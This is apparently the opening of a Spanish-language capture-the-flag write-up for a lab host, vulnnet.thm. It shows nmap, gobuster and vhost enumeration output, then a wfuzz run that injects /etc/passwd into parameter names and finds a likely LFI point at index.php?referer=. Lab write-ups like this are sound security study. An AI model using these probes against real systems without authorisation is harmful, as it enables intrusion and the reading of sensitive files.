
# SCAN+
```
PORT   STATE SERVICE VERSION                                                                                                                                 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
# WEB ENUM

## DIRECTORIES

Utilizando gobuster para buscar directorios encontramos los directorios comunes:
```
gobuster dir -u vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vulnnet.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/12 11:54:42 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/] 
/img                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/img/]
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
                                                                               
===============================================================
2022/08/12 11:56:03 Finished
===============================================================

```
## SUBDOMAINS

```
gobuster vhost -u vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://vulnnet.thm
[+] Method:       GET
[+] Threads:      40
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/08/12 11:50:33 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.vulnnet.thm (Status: 400) [Size: 424]
Found: broadcast.vulnnet.thm (Status: 401) [Size: 468]
Found: _domainkey.vulnnet.thm (Status: 400) [Size: 424]
                                                       
===============================================================
2022/08/12 11:50:59 Finished
===============================================================

```
Buscando subdominios (virtual hosts) tambien mediante gobuster encontramos el subdominio 

## PARAMETROS URL

Podemos utilizar wfuzz para buscar parametros para un posible ataque LFI
```
wfuzz -u vulnnet.thm/index.php?FUZZ=/etc/passwd  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -c --hw 462
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://vulnnet.thm/index.php?FUZZ=/etc/passwd
Total requests: 4712

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000003464:   200        174 L    514 W      7660 Ch     "referer"                                                                                   

Total time: 25.48573
Processed Requests: 4712
Filtered Requests: 4711
Requests/sec.: 184.8877
```
eliminando los paquetes de tamaño 462 W eliminamos los falsos positivos. Luego hemos encontrado una puerta de entrada para un posible
ataque del tipo LFI
> vulnnet.thm/index.php?referer=
